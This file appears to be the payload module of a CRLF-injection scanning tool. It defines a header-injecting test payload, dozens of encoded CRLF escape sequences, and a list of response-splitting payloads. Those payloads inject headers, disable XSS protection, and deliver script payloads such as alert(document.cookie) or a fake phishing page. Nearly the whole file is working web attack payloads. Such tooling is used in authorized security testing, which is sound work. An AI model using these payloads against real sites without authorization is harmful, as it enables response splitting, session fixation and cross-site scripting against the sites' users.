# -*- coding: utf-8 -*-

#All vulnerable URL(s) are accessed from this set
vuln_urls = set()

#Heuristic scanner result  
heuristic_result = set()

#A basic payload that heuristic scanner uses
heuristic_payload = "%0d%0aSet-Cookie:nefcore=crlfsuite"

#Escape characters
escape_chars = ['%0d','%0a', '%0d%20', '%0a%20' , '%3f' , '%0d%0a', '%23%0d', '%23%0a', '%23%0d%0a', '%u000a', '%25%30%61', '%25%30a', '%3f%0d', '%3f%0d%0a', '%3f%0a' , '%%0a0a', '%u000d', '%u0000', '%0d%09', '%0d%0a%09', '%0d%0a%20' , '%25250a', '%250a', '%2F..%0d%0a', '%2f%2e%2e%0d%0a', '%25%30' , '%2e%2e%2f%0d%0a', '%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D', '%E5%98%8A%E5%98%8D', '%e5%98%8a%e5%98%8d%0a', '%e5%98%8a%e5%98%8d%0d', '%e5%98%8a%e5%98%8d%0d%0a' , f"\\r", f"\\r\\n", f"\\r\\t", f"\\r\\n\\t", f"\\r%20", f"\\r\\n%20"]

#These strings are used before the escape characters
starting_strings = ["", "crlfsuite", "?crlfsuite=", "#", "__session_start__/"]

#CRLF injection payloads that leads to XSS
xss_payloads = ["%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E", "%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e", "%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E", "%0d%0a%0d%0a%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E", "%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22", "%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E", "%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a<html>Injected%02Content</html>", "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E", "%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E", "%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E", "%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e", "%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert('XSS');%3C%2fscript%3E", "%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(document.cookie)%3c/script%3e%2F..%2F..%2F..%2F../tr"]